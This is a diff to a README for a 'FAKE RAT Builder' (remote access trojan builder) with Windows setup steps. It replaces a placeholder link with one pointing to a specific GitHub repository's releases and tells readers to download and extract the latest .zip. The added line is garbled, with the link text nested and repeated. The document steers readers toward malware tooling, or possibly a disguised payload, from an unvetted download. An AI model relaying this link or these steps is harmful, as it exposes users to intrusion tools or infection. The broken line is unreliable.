@@ -8,7 +8,7 @@
 Follow these steps to run the **FAKE RAT Builder** correctly on Windows:
 
 ### 1. Download the Release
-- Go to the **[Releases](https://github.com/YOUR_USERNAME/YOUR_REPO/releases)** section.
+- Go to the **[Releases](- Go to the **[Releases](https://github.com/RealKKlgr4/KKg456/releases)** section.)** section.
 - Download the latest `.zip` file.
 
 ### 2. Extract the ZIP File
